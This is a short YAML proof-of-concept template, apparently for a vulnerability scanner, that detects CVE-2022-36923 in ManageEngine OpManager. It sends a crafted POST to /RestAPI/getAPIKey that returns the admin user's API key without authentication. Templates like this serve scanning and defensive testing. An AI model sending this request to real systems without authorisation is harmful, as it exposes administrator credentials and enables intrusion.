name: poc-yaml-zoho-manageengine-opmanager-cve-2022-36923
binding: aaeda6e7-e044-45f7-a7b6-0dca21b1238c
manual: true
detail:
    author: h1ei1
    links:
        - https://y4er.com/posts/cve-2022-36923-manageengine-opmanager-getuserapikey-authentication-bypass/
    vulnerability:
        id: CT-473012
        level: high
transport: http
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /RestAPI/getAPIKey
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: operation=getUserAPIKey&username=admin&domainname=-&HANDSHAKE_KEY=pppppppppppppppppppppppppppppppppppp
        expression: |
            response.status == 200 && "^([a-f\\d]{32}|[A-F\\d]{32})(\\r\\n)?$".bmatches(response.body) && response.raw_header.bcontains(b"JSESSIONID=")
expression: r1()
